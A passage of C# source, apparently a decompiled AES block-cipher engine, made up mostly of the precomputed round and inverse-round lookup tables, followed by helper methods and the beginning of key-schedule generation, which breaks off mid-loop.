			3417354363u,
			4233385128u,
			3602627437u,
			974525996u
		};

		private static readonly uint[] T1 = new uint[256]
		{
			1667483301u,
			2088564868u,
			2004348569u,
			2071721613u,
			4076011277u,
			1802229437u,
			1869602481u,
			3318059348u,
			808476752u,
			16843267u,
			1734856361u,
			724260477u,
			4278118169u,
			3621238114u,
			2880130534u,
			1987505306u,
			3402272581u,
			2189565853u,
			3385428288u,
			2105408135u,
			4210749205u,
			1499050731u,
			1195871945u,
			4042324747u,
			2913812972u,
			3570709351u,
			2728550397u,
			2947499498u,
			2627478463u,
			2762232823u,
			1920132246u,
			3233848155u,
			3082253762u,
			4261273884u,
			2475900334u,
			640044138u,
			909536346u,
			1061125697u,
			4160222466u,
			3435955023u,
			875849820u,
			2779075060u,
			3857043764u,
			4059166984u,
			1903288979u,
			3638078323u,
			825320019u,
			353708607u,
			67373068u,
			3351745874u,
			589514341u,
			3284376926u,
			404238376u,
			2526427041u,
			84216335u,
			2593796021u,
			117902857u,
			303178806u,
			2155879323u,
			3806519101u,
			3958099238u,
			656887401u,
			2998042573u,
			1970662047u,
			151589403u,
			2206408094u,
			741103732u,
			437924910u,
			454768173u,
			1852759218u,
			1515893998u,
			2694863867u,
			1381147894u,
			993752653u,
			3604395873u,
			3014884814u,
			690573947u,
			3823361342u,
			791633521u,
			2223248279u,
			1397991157u,
			3520182632u,
			0u,
			3991781676u,
			538984544u,
			4244431647u,
			2981198280u,
			1532737261u,
			1785386174u,
			3419114822u,
			3200149465u,
			960066123u,
			1246401758u,
			1280088276u,
			1482207464u,
			3486483786u,
			3503340395u,
			4025468202u,
			2863288293u,
			4227591446u,
			1128498885u,
			1296931543u,
			859006549u,
			2240090516u,
			1162185423u,
			4193904912u,
			33686534u,
			2139094657u,
			1347461360u,
			1010595908u,
			2678007226u,
			2829601763u,
			1364304627u,
			2745392638u,
			1077969088u,
			2408514954u,
			2459058093u,
			2644320700u,
			943222856u,
			4126535940u,
			3166462943u,
			3065411521u,
			3671764853u,
			555827811u,
			269492272u,
			4294960410u,
			4092853518u,
			3537026925u,
			3452797260u,
			202119188u,
			320022069u,
			3974939439u,
			1600110305u,
			2543269282u,
			1145342156u,
			387395129u,
			3301217111u,
			2812761586u,
			2122251394u,
			1027439175u,
			1684326572u,
			1566423783u,
			421081643u,
			1936975509u,
			1616953504u,
			2172721560u,
			1330618065u,
			3705447295u,
			572671078u,
			707417214u,
			2425371563u,
			2290617219u,
			1179028682u,
			4008625961u,
			3099093971u,
			336865340u,
			3739133817u,
			1583267042u,
			185275933u,
			3688607094u,
			3772832571u,
			842163286u,
			976909390u,
			168432670u,
			1229558491u,
			101059594u,
			606357612u,
			1549580516u,
			3267534685u,
			3553869166u,
			2896970735u,
			1650640038u,
			2442213800u,
			2509582756u,
			3840201527u,
			2038035083u,
			3890730290u,
			3368586051u,
			926379609u,
			1835915959u,
			2374828428u,
			3587551588u,
			1313774802u,
			2846444000u,
			1819072692u,
			1448520954u,
			4109693703u,
			3941256997u,
			1701169839u,
			2054878350u,
			2930657257u,
			134746136u,
			3132780501u,
			2021191816u,
			623200879u,
			774790258u,
			471611428u,
			2795919345u,
			3031724999u,
			3334903633u,
			3907570467u,
			3722289532u,
			1953818780u,
			522141217u,
			1263245021u,
			3183305180u,
			2341145990u,
			2324303749u,
			1886445712u,
			1044282434u,
			3048567236u,
			1718013098u,
			1212715224u,
			50529797u,
			4143380225u,
			235805714u,
			1633796771u,
			892693087u,
			1465364217u,
			3115936208u,
			2256934801u,
			3250690392u,
			488454695u,
			2661164985u,
			3789674808u,
			4177062675u,
			2560109491u,
			286335539u,
			1768542907u,
			3654920560u,
			2391672713u,
			2492740519u,
			2610638262u,
			505297954u,
			2273777042u,
			3924412704u,
			3469641545u,
			1431677695u,
			673730680u,
			3755976058u,
			2357986191u,
			2711706104u,
			2307459456u,
			218962455u,
			3216991706u,
			3873888049u,
			1111655622u,
			1751699640u,
			1094812355u,
			2576951728u,
			757946999u,
			252648977u,
			2964356043u,
			1414834428u,
			3149622742u,
			370551866u
		};

		private static readonly uint[] T2 = new uint[256]
		{
			1673962851u,
			2096661628u,
			2012125559u,
			2079755643u,
			4076801522u,
			1809235307u,
			1876865391u,
			3314635973u,
			811618352u,
			16909057u,
			1741597031u,
			727088427u,
			4276558334u,
			3618988759u,
			2874009259u,
			1995217526u,
			3398387146u,
			2183110018u,
			3381215433u,
			2113570685u,
			4209972730u,
			1504897881u,
			1200539975u,
			4042984432u,
			2906778797u,
			3568527316u,
			2724199842u,
			2940594863u,
			2619588508u,
			2756966308u,
			1927583346u,
			3231407040u,
			3077948087u,
			4259388669u,
			2470293139u,
			642542118u,
			913070646u,
			1065238847u,
			4160029431u,
			3431157708u,
			879254580u,
			2773611685u,
			3855693029u,
			4059629809u,
			1910674289u,
			3635114968u,
			828527409u,
			355090197u,
			67636228u,
			3348452039u,
			591815971u,
			3281870531u,
			405809176u,
			2520228246u,
			84545285u,
			2586817946u,
			118360327u,
			304363026u,
			2149292928u,
			3806281186u,
			3956090603u,
			659450151u,
			2994720178u,
			1978310517u,
			152181513u,
			2199756419u,
			743994412u,
			439627290u,
			456535323u,
			1859957358u,
			1521806938u,
			2690382752u,
			1386542674u,
			997608763u,
			3602342358u,
			3011366579u,
			693271337u,
			3822927587u,
			794718511u,
			2215876484u,
			1403450707u,
			3518589137u,
			0u,
			3988860141u,
			541089824u,
			4242743292u,
			2977548465u,
			1538714971u,
			1792327274u,
			3415033547u,
			3194476990u,
			963791673u,
			1251270218u,
			1285084236u,
			1487988824u,
			3481619151u,
			3501943760u,
			4022676207u,
			2857362858u,
			4226619131u,
			1132905795u,
			1301993293u,
			862344499u,
			2232521861u,
			1166724933u,
			4192801017u,
			33818114u,
			2147385727u,
			1352724560u,
			1014514748u,
			2670049951u,
			2823545768u,
			1369633617u,
			2740846243u,
			1082179648u,
			2399505039u,
			2453646738u,
			2636233885u,
			946882616u,
			4126213365u,
			3160661948u,
			3061301686u,
			3668932058u,
			557998881u,
			270544912u,
			4293204735u,
			4093447923u,
			3535760850u,
			3447803085u,
			202904588u,
			321271059u,
			3972214764u,
			1606345055u,
			2536874647u,
			1149815876u,
			388905239u,
			3297990596u,
			2807427751u,
			2130477694u,
			1031423805u,
			1690872932u,
			1572530013u,
			422718233u,
			1944491379u,
			1623236704u,
			2165938305u,
			1335808335u,
			3701702620u,
			574907938u,
			710180394u,
			2419829648u,
			2282455944u,
			1183631942u,
			4006029806u,
			3094074296u,
			338181140u,
			3735517662u,
			1589437022u,
			185998603u,
			3685578459u,
			3772464096u,
			845436466u,
			980700730u,
			169090570u,
			1234361161u,
			101452294u,
			608726052u,
			1555620956u,
			3265224130u,
			3552407251u,
			2890133420u,
			1657054818u,
			2436475025u,
			2503058581u,
			3839047652u,
			2045938553u,
			3889509095u,
			3364570056u,
			929978679u,
			1843050349u,
			2365688973u,
			3585172693u,
			1318900302u,
			2840191145u,
			1826141292u,
			1454176854u,
			4109567988u,
			3939444202u,
			1707781989u,
			2062847610u,
			2923948462u,
			135272456u,
			3127891386u,
			2029029496u,
			625635109u,
			777810478u,
			473441308u,
			2790781350u,
			3027486644u,
			3331805638u,
			3905627112u,
			3718347997u,
			1961401460u,
			524165407u,
			1268178251u,
			3177307325u,
			2332919435u,
			2316273034u,
			1893765232u,
			1048330814u,
			3044132021u,
			1724688998u,
			1217452104u,
			50726147u,
			4143383030u,
			236720654u,
			1640145761u,
			896163637u,
			1471084887u,
			3110719673u,
			2249691526u,
			3248052417u,
			490350365u,
			2653403550u,
			3789109473u,
			4176155640u,
			2553000856u,
			287453969u,
			1775418217u,
			3651760345u,
			2382858638u,
			2486413204u,
			2603464347u,
			507257374u,
			2266337927u,
			3922272489u,
			3464972750u,
			1437269845u,
			676362280u,
			3752164063u,
			2349043596u,
			2707028129u,
			2299101321u,
			219813645u,
			3211123391u,
			3872862694u,
			1115997762u,
			1758509160u,
			1099088705u,
			2569646233u,
			760903469u,
			253628687u,
			2960903088u,
			1420360788u,
			3144537787u,
			371997206u
		};

		private static readonly uint[] T3 = new uint[256]
		{
			3332727651u,
			4169432188u,
			4003034999u,
			4136467323u,
			4279104242u,
			3602738027u,
			3736170351u,
			2438251973u,
			1615867952u,
			33751297u,
			3467208551u,
			1451043627u,
			3877240574u,
			3043153879u,
			1306962859u,
			3969545846u,
			2403715786u,
			530416258u,
			2302724553u,
			4203183485u,
			4011195130u,
			3001768281u,
			2395555655u,
			4211863792u,
			1106029997u,
			3009926356u,
			1610457762u,
			1173008303u,
			599760028u,
			1408738468u,
			3835064946u,
			2606481600u,
			1975695287u,
			3776773629u,
			1034851219u,
			1282024998u,
			1817851446u,
			2118205247u,
			4110612471u,
			2203045068u,
			1750873140u,
			1374987685u,
			3509904869u,
			4178113009u,
			3801313649u,
			2876496088u,
			1649619249u,
			708777237u,
			135005188u,
			2505230279u,
			1181033251u,
			2640233411u,
			807933976u,
			933336726u,
			168756485u,
			800430746u,
			235472647u,
			607523346u,
			463175808u,
			3745374946u,
			3441880043u,
			1315514151u,
			2144187058u,
			3936318837u,
			303761673u,
			496927619u,
			1484008492u,
			875436570u,
			908925723u,
			3702681198u,
			3035519578u,
			1543217312u,
			2767606354u,
			1984772923u,
			3076642518u,
			2110698419u,
			1383803177u,
			3711886307u,
			1584475951u,
			328696964u,
			2801095507u,
			3110654417u,
			0u,
			3240947181u,
			1080041504u,
			3810524412u,
			2043195825u,
			3069008731u,
			3569248874u,
			2370227147u,
			1742323390u,
			1917532473u,
			2497595978u,
			2564049996u,
			2968016984u,
			2236272591u,
			3144405200u,
			3307925487u,
			1340451498u,
			3977706491u,
			2261074755u,
			2597801293u,
			1716859699u,
			294946181u,
			2328839493u,
			3910203897u,
			67502594u,
			4269899647u,
			2700103760u,
			2017737788u,
			632987551u,
			1273211048u,
			2733855057u,
			1576969123u,
			2160083008u,
			92966799u,
			1068339858u,
			566009245u,
			1883781176u,
			4043634165u,
			1675607228u,
			2009183926u,
			2943736538u,
			1113792801u,
			540020752u,
			3843751935u,
			4245615603u,
			3211645650u,
			2169294285u,
			403966988u,
			641012499u,
			3274697964u,
			3202441055u,
			899848087u,
			2295088196u,
			775493399u,
			2472002756u,
			1441965991u,
			4236410494u,
			2051489085u,
			3366741092u,
			3135724893u,
			841685273u,
			3868554099u,
			3231735904u,
			429425025u,
			2664517455u,
			2743065820u,
			1147544098u,
			1417554474u,
			1001099408u,
			193169544u,
			2362066502u,
			3341414126u,
			1809037496u,
			675025940u,
			2809781982u,
			3168951902u,
			371002123u,
			2910247899u,
			3678134496u,
			1683370546u,
			1951283770u,
			337512970u,
			2463844681u,
			201983494u,
			1215046692u,
			3101973596u,
			2673722050u,
			3178157011u,
			1139780780u,
			3299238498u,
			967348625u,
			832869781u,
			3543655652u,
			4069226873u,
			3576883175u,
			2336475336u,
			1851340599u,
			3669454189u,
			25988493u,
			2976175573u,
			2631028302u,
			1239460265u,
			3635702892u,
			2902087254u,
			4077384948u,
			3475368682u,
			3400492389u,
			4102978170u,
			1206496942u,
			270010376u,
			1876277946u,
			4035475576u,
			1248797989u,
			1550986798u,
			941890588u,
			1475454630u,
			1942467764u,
			2538718918u,
			3408128232u,
			2709315037u,
			3902567540u,
			1042358047u,
			2531085131u,
			1641856445u,
			226921355u,
			260409994u,
			3767562352u,
			2084716094u,
			1908716981u,
			3433719398u,
			2430093384u,
			100991747u,
			4144101110u,
			470945294u,
			3265487201u,
			1784624437u,
			2935576407u,
			1775286713u,
			395413126u,
			2572730817u,
			975641885u,
			666476190u,
			3644383713u,
			3943954680u,
			733190296u,
			573772049u,
			3535497577u,
			2842745305u,
			126455438u,
			866620564u,
			766942107u,
			1008868894u,
			361924487u,
			3374377449u,
			2269761230u,
			2868860245u,
			1350051880u,
			2776293343u,
			59739276u,
			1509466529u,
			159418761u,
			437718285u,
			1708834751u,
			3610371814u,
			2227585602u,
			3501746280u,
			2193834305u,
			699439513u,
			1517759789u,
			504434447u,
			2076946608u,
			2835108948u,
			1842789307u,
			742004246u
		};

		private static readonly uint[] Tinv0 = new uint[256]
		{
			1353184337u,
			1399144830u,
			3282310938u,
			2522752826u,
			3412831035u,
			4047871263u,
			2874735276u,
			2466505547u,
			1442459680u,
			4134368941u,
			2440481928u,
			625738485u,
			4242007375u,
			3620416197u,
			2151953702u,
			2409849525u,
			1230680542u,
			1729870373u,
			2551114309u,
			3787521629u,
			41234371u,
			317738113u,
			2744600205u,
			3338261355u,
			3881799427u,
			2510066197u,
			3950669247u,
			3663286933u,
			763608788u,
			3542185048u,
			694804553u,
			1154009486u,
			1787413109u,
			2021232372u,
			1799248025u,
			3715217703u,
			3058688446u,
			397248752u,
			1722556617u,
			3023752829u,
			407560035u,
			2184256229u,
			1613975959u,
			1165972322u,
			3765920945u,
			2226023355u,
			480281086u,
			2485848313u,
			1483229296u,
			436028815u,
			2272059028u,
			3086515026u,
			601060267u,
			3791801202u,
			1468997603u,
			715871590u,
			120122290u,
			63092015u,
			2591802758u,
			2768779219u,
			4068943920u,
			2997206819u,
			3127509762u,
			1552029421u,
			723308426u,
			2461301159u,
			4042393587u,
			2715969870u,
			3455375973u,
			3586000134u,
			526529745u,
			2331944644u,
			2639474228u,
			2689987490u,
			853641733u,
			1978398372u,
			971801355u,
			2867814464u,
			111112542u,
			1360031421u,
			4186579262u,
			1023860118u,
			2919579357u,
			1186850381u,
			3045938321u,
			90031217u,
			1876166148u,
			4279586912u,
			620468249u,
			2548678102u,
			3426959497u,
			2006899047u,
			3175278768u,
			2290845959u,
			945494503u,
			3689859193u,
			1191869601u,
			3910091388u,
			3374220536u,
			0u,
			2206629897u,
			1223502642u,
			2893025566u,
			1316117100u,
			4227796733u,
			1446544655u,
			517320253u,
			658058550u,
			1691946762u,
			564550760u,
			3511966619u,
			976107044u,
			2976320012u,
			266819475u,
			3533106868u,
			2660342555u,
			1338359936u,
			2720062561u,
			1766553434u,
			370807324u,
			179999714u,
			3844776128u,
			1138762300u,
			488053522u,
			185403662u,
			2915535858u,
			3114841645u,
			3366526484u,
			2233069911u,
			1275557295u,
			3151862254u,
			4250959779u,
			2670068215u,
			3170202204u,
			3309004356u,
			880737115u,
			1982415755u,
			3703972811u,
			1761406390u,
			1676797112u,
			3403428311u,
			277177154u,
			1076008723u,
			538035844u,
			2099530373u,
			4164795346u,
			288553390u,
			1839278535u,
			1261411869u,
			4080055004u,
			3964831245u,
			3504587127u,
			1813426987u,
			2579067049u,
			4199060497u,
			577038663u,
			3297574056u,
			440397984u,
			3626794326u,
			4019204898u,
			3343796615u,
			3251714265u,
			4272081548u,
			906744984u,
			3481400742u,
			685669029u,
			646887386u,
			2764025151u,
			3835509292u,
			227702864u,
			2613862250u,
			1648787028u,
			3256061430u,
			3904428176u,
			1593260334u,
			4121936770u,
			3196083615u,
			2090061929u,
			2838353263u,
			3004310991u,
			999926984u,
			2809993232u,
			1852021992u,
			2075868123u,
			158869197u,
			4095236462u,
			28809964u,
			2828685187u,
			1701746150u,
			2129067946u,
			147831841u,
			3873969647u,
			3650873274u,
			3459673930u,
			3557400554u,
			3598495785u,
			2947720241u,
			824393514u,
			815048134u,
			3227951669u,
			935087732u,
			2798289660u,
			2966458592u,
			366520115u,
			1251476721u,
			4158319681u,
			240176511u,
			804688151u,
			2379631990u,
			1303441219u,
			1414376140u,
			3741619940u,
			3820343710u,
			461924940u,
			3089050817u,
			2136040774u,
			82468509u,
			1563790337u,
			1937016826u,
			776014843u,
			1511876531u,
			1389550482u,
			861278441u,
			323475053u,
			2355222426u,
			2047648055u,
			2383738969u,
			2302415851u,
			3995576782u,
			902390199u,
			3991215329u,
			1018251130u,
			1507840668u,
			1064563285u,
			2043548696u,
			3208103795u,
			3939366739u,
			1537932639u,
			342834655u,
			2262516856u,
			2180231114u,
			1053059257u,
			741614648u,
			1598071746u,
			1925389590u,
			203809468u,
			2336832552u,
			1100287487u,
			1895934009u,
			3736275976u,
			2632234200u,
			2428589668u,
			1636092795u,
			1890988757u,
			1952214088u,
			1113045200u
		};

		private static readonly uint[] Tinv1 = new uint[256]
		{
			2817806672u,
			1698790995u,
			2752977603u,
			1579629206u,
			1806384075u,
			1167925233u,
			1492823211u,
			65227667u,
			4197458005u,
			1836494326u,
			1993115793u,
			1275262245u,
			3622129660u,
			3408578007u,
			1144333952u,
			2741155215u,
			1521606217u,
			465184103u,
			250234264u,
			3237895649u,
			1966064386u,
			4031545618u,
			2537983395u,
			4191382470u,
			1603208167u,
			2626819477u,
			2054012907u,
			1498584538u,
			2210321453u,
			561273043u,
			1776306473u,
			3368652356u,
			2311222634u,
			2039411832u,
			1045993835u,
			1907959773u,
			1340194486u,
			2911432727u,
			2887829862u,
			986611124u,
			1256153880u,
			823846274u,
			860985184u,
			2136171077u,
			2003087840u,
			2926295940u,
			2692873756u,
			722008468u,
			1749577816u,
			4249194265u,
			1826526343u,
			4168831671u,
			3547573027u,
			38499042u,
			2401231703u,
			2874500650u,
			686535175u,
			3266653955u,
			2076542618u,
			137876389u,
			2267558130u,
			2780767154u,
			1778582202u,
			2182540636u,
			483363371u,
			3027871634u,
			4060607472u,
			3798552225u,
			4107953613u,
			3188000469u,
			1647628575u,
			4272342154u,
			1395537053u,
			1442030240u,
			3783918898u,
			3958809717u,
			3968011065u,
			4016062634u,
			2675006982u,
			275692881u,
			2317434617u,
			115185213u,
			88006062u,
			3185986886u,
			2371129781u,
			1573155077u,
			3557164143u,
			357589247u,
			4221049124u,
			3921532567u,
			1128303052u,
			2665047927u,
			1122545853u,
			2341013384u,
			1528424248u,
			4006115803u,
			175939911u,
			256015593u,
			512030921u,
			0u,
			2256537987u,
			3979031112u,
			1880170156u,
			1918528590u,
			4279172603u,
			948244310u,
			3584965918u,
			959264295u,
			3641641572u,
			2791073825u,
			1415289809u,
			775300154u,
			1728711857u,
			3881276175u,
			2532226258u,
			2442861470u,
			3317727311u,
			551313826u,
			1266113129u,
			437394454u,
			3130253834u,
			715178213u,
			3760340035u,
			387650077u,
			218697227u,
			3347837613u,
			2830511545u,
			2837320904u,
			435246981u,
			125153100u,
			3717852859u,
			1618977789u,
			637663135u,
			4117912764u,
			996558021u,
			2130402100u,
			692292470u,
			3324234716u,
			4243437160u,
			4058298467u,
			3694254026u,
			2237874704u,
			580326208u,
			298222624u,
			608863613u,
			1035719416u,
			855223825u,
			2703869805u,
			798891339u,
			817028339u,
			1384517100u,
			3821107152u,
			380840812u,
			3111168409u,
			1217663482u,
			1693009698u,
			2365368516u,
			1072734234u,
			746411736u,
			2419270383u,
			1313441735u,
			3510163905u,
			2731183358u,
			198481974u,
			2180359887u,
			3732579624u,
			2394413606u,
			3215802276u,
			2637835492u,
			2457358349u,
			3428805275u,
			1182684258u,
			328070850u,
			3101200616u,
			4147719774u,
			2948825845u,
			2153619390u,
			2479909244u,
			768962473u,
			304467891u,
			2578237499u,
			2098729127u,
			1671227502u,
			3141262203u,
			2015808777u,
			408514292u,
			3080383489u,
			2588902312u,
			1855317605u,
			3875515006u,
			3485212936u,
			3893751782u,
			2615655129u,
			913263310u,
			161475284u,
			2091919830u,
			2997105071u,
			591342129u,
			2493892144u,
			1721906624u,
			3159258167u,
			3397581990u,
			3499155632u,
			3634836245u,
			2550460746u,
			3672916471u,
			1355644686u,
			4136703791u,
			3595400845u,
			2968470349u,
			1303039060u,
			76997855u,
			3050413795u,
			2288667675u,
			523026872u,
			1365591679u,
			3932069124u,
			898367837u,
			1955068531u,
			1091304238u,
			493335386u,
			3537605202u,
			1443948851u,
			1205234963u,
			1641519756u,
			211892090u,
			351820174u,
			1007938441u,
			665439982u,
			3378624309u,
			3843875309u,
			2974251580u,
			3755121753u,
			1945261375u,
			3457423481u,
			935818175u,
			3455538154u,
			2868731739u,
			1866325780u,
			3678697606u,
			4088384129u,
			3295197502u,
			874788908u,
			1084473951u,
			3273463410u,
			635616268u,
			1228679307u,
			2500722497u,
			27801969u,
			3003910366u,
			3837057180u,
			3243664528u,
			2227927905u,
			3056784752u,
			1550600308u,
			1471729730u
		};

		private static readonly uint[] Tinv2 = new uint[256]
		{
			4098969767u,
			1098797925u,
			387629988u,
			658151006u,
			2872822635u,
			2636116293u,
			4205620056u,
			3813380867u,
			807425530u,
			1991112301u,
			3431502198u,
			49620300u,
			3847224535u,
			717608907u,
			891715652u,
			1656065955u,
			2984135002u,
			3123013403u,
			3930429454u,
			4267565504u,
			801309301u,
			1283527408u,
			1183687575u,
			3547055865u,
			2399397727u,
			2450888092u,
			1841294202u,
			1385552473u,
			3201576323u,
			1951978273u,
			3762891113u,
			3381544136u,
			3262474889u,
			2398386297u,
			1486449470u,
			3106397553u,
			3787372111u,
			2297436077u,
			550069932u,
			3464344634u,
			3747813450u,
			451248689u,
			1368875059u,
			1398949247u,
			1689378935u,
			1807451310u,
			2180914336u,
			150574123u,
			1215322216u,
			1167006205u,
			3734275948u,
			2069018616u,
			1940595667u,
			1265820162u,
			534992783u,
			1432758955u,
			3954313000u,
			3039757250u,
			3313932923u,
			936617224u,
			674296455u,
			3206787749u,
			50510442u,
			384654466u,
			3481938716u,
			2041025204u,
			133427442u,
			1766760930u,
			3664104948u,
			84334014u,
			886120290u,
			2797898494u,
			775200083u,
			4087521365u,
			2315596513u,
			4137973227u,
			2198551020u,
			1614850799u,
			1901987487u,
			1857900816u,
			557775242u,
			3717610758u,
			1054715397u,
			3863824061u,
			1418835341u,
			3295741277u,
			100954068u,
			1348534037u,
			2551784699u,
			3184957417u,
			1082772547u,
			3647436702u,
			3903896898u,
			2298972299u,
			434583643u,
			3363429358u,
			2090944266u,
			1115482383u,
			2230896926u,
			0u,
			2148107142u,
			724715757u,
			287222896u,
			1517047410u,
			251526143u,
			2232374840u,
			2923241173u,
			758523705u,
			252339417u,
			1550328230u,
			1536938324u,
			908343854u,
			168604007u,
			1469255655u,
			4004827798u,
			2602278545u,
			3229634501u,
			3697386016u,
			2002413899u,
			303830554u,
			2481064634u,
			2696996138u,
			574374880u,
			454171927u,
			151915277u,
			2347937223u,
			3056449960u,
			504678569u,
			4049044761u,
			1974422535u,
			2582559709u,
			2141453664u,
			33005350u,
			1918680309u,
			1715782971u,
			4217058430u,
			1133213225u,
			600562886u,
			3988154620u,
			3837289457u,
			836225756u,
			1665273989u,
			2534621218u,
			3330547729u,
			1250262308u,
			3151165501u,
			4188934450u,
			700935585u,
			2652719919u,
			3000824624u,
			2249059410u,
			3245854947u,
			3005967382u,
			1890163129u,
			2484206152u,
			3913753188u,
			4238918796u,
			4037024319u,
			2102843436u,
			857927568u,
			1233635150u,
			953795025u,
			3398237858u,
			3566745099u,
			4121350017u,
			2057644254u,
			3084527246u,
			2906629311u,
			976020637u,
			2018512274u,
			1600822220u,
			2119459398u,
			2381758995u,
			3633375416u,
			959340279u,
			3280139695u,
			1570750080u,
			3496574099u,
			3580864813u,
			634368786u,
			2898803609u,
			403744637u,
			2632478307u,
			1004239803u,
			650971512u,
			1500443672u,
			2599158199u,
			1334028442u,
			2514904430u,
			4289363686u,
			3156281551u,
			368043752u,
			3887782299u,
			1867173430u,
			2682967049u,
			2955531900u,
			2754719666u,
			1059729699u,
			2781229204u,
			2721431654u,
			1316239292u,
			2197595850u,
			2430644432u,
			2805143000u,
			82922136u,
			3963746266u,
			3447656016u,
			2434215926u,
			1299615190u,
			4014165424u,
			2865517645u,
			2531581700u,
			3516851125u,
			1783372680u,
			750893087u,
			1699118929u,
			1587348714u,
			2348899637u,
			2281337716u,
			201010753u,
			1739807261u,
			3683799762u,
			283718486u,
			3597472583u,
			3617229921u,
			2704767500u,
			4166618644u,
			334203196u,
			2848910887u,
			1639396809u,
			484568549u,
			1199193265u,
			3533461983u,
			4065673075u,
			337148366u,
			3346251575u,
			4149471949u,
			4250885034u,
			1038029935u,
			1148749531u,
			2949284339u,
			1756970692u,
			607661108u,
			2747424576u,
			488010435u,
			3803974693u,
			1009290057u,
			234832277u,
			2822336769u,
			201907891u,
			3034094820u,
			1449431233u,
			3413860740u,
			852848822u,
			1816687708u,
			3100656215u
		};

		private static readonly uint[] Tinv3 = new uint[256]
		{
			1364240372u,
			2119394625u,
			449029143u,
			982933031u,
			1003187115u,
			535905693u,
			2896910586u,
			1267925987u,
			542505520u,
			2918608246u,
			2291234508u,
			4112862210u,
			1341970405u,
			3319253802u,
			645940277u,
			3046089570u,
			3729349297u,
			627514298u,
			1167593194u,
			1575076094u,
			3271718191u,
			2165502028u,
			2376308550u,
			1808202195u,
			65494927u,
			362126482u,
			3219880557u,
			2514114898u,
			3559752638u,
			1490231668u,
			1227450848u,
			2386872521u,
			1969916354u,
			4101536142u,
			2573942360u,
			668823993u,
			3199619041u,
			4028083592u,
			3378949152u,
			2108963534u,
			1662536415u,
			3850514714u,
			2539664209u,
			1648721747u,
			2984277860u,
			3146034795u,
			4263288961u,
			4187237128u,
			1884842056u,
			2400845125u,
			2491903198u,
			1387788411u,
			2871251827u,
			1927414347u,
			3814166303u,
			1714072405u,
			2986813675u,
			788775605u,
			2258271173u,
			3550808119u,
			821200680u,
			598910399u,
			45771267u,
			3982262806u,
			2318081231u,
			2811409529u,
			4092654087u,
			1319232105u,
			1707996378u,
			114671109u,
			3508494900u,
			3297443494u,
			882725678u,
			2728416755u,
			87220618u,
			2759191542u,
			188345475u,
			1084944224u,
			1577492337u,
			3176206446u,
			1056541217u,
			2520581853u,
			3719169342u,
			1296481766u,
			2444594516u,
			1896177092u,
			74437638u,
			1627329872u,
			421854104u,
			3600279997u,
			2311865152u,
			1735892697u,
			2965193448u,
			126389129u,
			3879230233u,
			2044456648u,
			2705787516u,
			2095648578u,
			4173930116u,
			0u,
			159614592u,
			843640107u,
			514617361u,
			1817080410u,
			4261150478u,
			257308805u,
			1025430958u,
			908540205u,
			174381327u,
			1747035740u,
			2614187099u,
			607792694u,
			212952842u,
			2467293015u,
			3033700078u,
			463376795u,
			2152711616u,
			1638015196u,
			1516850039u,
			471210514u,
			3792353939u,
			3236244128u,
			1011081250u,
			303896347u,
			235605257u,
			4071475083u,
			767142070u,
			348694814u,
			1468340721u,
			2940995445u,
			4005289369u,
			2751291519u,
			4154402305u,
			1555887474u,
			1153776486u,
			1530167035u,
			2339776835u,
			3420243491u,
			3060333805u,
			3093557732u,
			3620396081u,
			1108378979u,
			322970263u,
			2216694214u,
			2239571018u,
			3539484091u,
			2920362745u,
			3345850665u,
			491466654u,
			3706925234u,
			233591430u,
			2010178497u,
			728503987u,
			2845423984u,
			301615252u,
			1193436393u,
			2831453436u,
			2686074864u,
			1457007741u,
			586125363u,
			2277985865u,
			3653357880u,
			2365498058u,
			2553678804u,
			2798617077u,
			2770919034u,
			3659959991u,
			1067761581u,
			753179962u,
			1343066744u,
			1788595295u,
			1415726718u,
			4139914125u,
			2431170776u,
			777975609u,
			2197139395u,
			2680062045u,
			1769771984u,
			1873358293u,
			3484619301u,
			3359349164u,
			279411992u,
			3899548572u,
			3682319163u,
			3439949862u,
			1861490777u,
			3959535514u,
			2208864847u,
			3865407125u,
			2860443391u,
			554225596u,
			4024887317u,
			3134823399u,
			1255028335u,
			3939764639u,
			701922480u,
			833598116u,
			707863359u,
			3325072549u,
			901801634u,
			1949809742u,
			4238789250u,
			3769684112u,
			857069735u,
			4048197636u,
			1106762476u,
			2131644621u,
			389019281u,
			1989006925u,
			1129165039u,
			3428076970u,
			3839820950u,
			2665723345u,
			1276872810u,
			3250069292u,
			1182749029u,
			2634345054u,
			22885772u,
			4201870471u,
			4214112523u,
			3009027431u,
			2454901467u,
			3912455696u,
			1829980118u,
			2592891351u,
			930745505u,
			1502483704u,
			3951639571u,
			3471714217u,
			3073755489u,
			3790464284u,
			2050797895u,
			2623135698u,
			1430221810u,
			410635796u,
			1941911495u,
			1407897079u,
			1599843069u,
			3742658365u,
			2022103876u,
			3397514159u,
			3107898472u,
			942421028u,
			3261022371u,
			376619805u,
			3154912738u,
			680216892u,
			4282488077u,
			963707304u,
			148812556u,
			3634160820u,
			1687208278u,
			2069988555u,
			3580933682u,
			1215585388u,
			3494008760u
		};

		private const uint m1 = 2155905152u;

		private const uint m2 = 2139062143u;

		private const uint m3 = 27u;

		private int ROUNDS;

		private uint[,] WorkingKey;

		private uint C0;

		private uint C1;

		private uint C2;

		private uint C3;

		private bool forEncryption;

		private const int BLOCK_SIZE = 16;

		public string AlgorithmName => "AES";

		public bool IsPartialBlockOkay => false;

		private uint Shift(uint r, int shift)
		{
			return (r >> shift) | (r << 32 - shift);
		}

		private uint FFmulX(uint x)
		{
			return ((x & 0x7F7F7F7F) << 1) ^ (((uint)((int)x & -2139062144) >> 7) * 27);
		}

		private uint Inv_Mcol(uint x)
		{
			uint num = FFmulX(x);
			uint num2 = FFmulX(num);
			uint num3 = FFmulX(num2);
			uint num4 = x ^ num3;
			return num ^ num2 ^ num3 ^ Shift(num ^ num4, 8) ^ Shift(num2 ^ num4, 16) ^ Shift(num4, 24);
		}

		private uint SubWord(uint x)
		{
			return (uint)(S[x & 0xFF] | (S[(x >> 8) & 0xFF] << 8) | (S[(x >> 16) & 0xFF] << 16) | (S[(x >> 24) & 0xFF] << 24));
		}

		private uint[,] GenerateWorkingKey(byte[] key, bool forEncryption)
		{
			int num = key.Length / 4;
			if ((num != 4 && num != 6 && num != 8) || num * 4 != key.Length)
			{
				throw new ArgumentException("Key length not 128/192/256 bits.");
			}
			ROUNDS = num + 6;
			uint[,] array = new uint[ROUNDS + 1, 4];
			int num2 = 0;
			int num3 = 0;
			while (num3 < key.Length)
			{
				array[num2 >> 2, num2 & 3] = Pack.LE_To_UInt32(key, num3);
				num3 += 4;
				num2++;
			}
			int num4 = ROUNDS + 1 << 2;
			for (int i = num; i < num4; i++)
			{
				uint num5 = array[i - 1 >> 2, (i - 1) & 3];
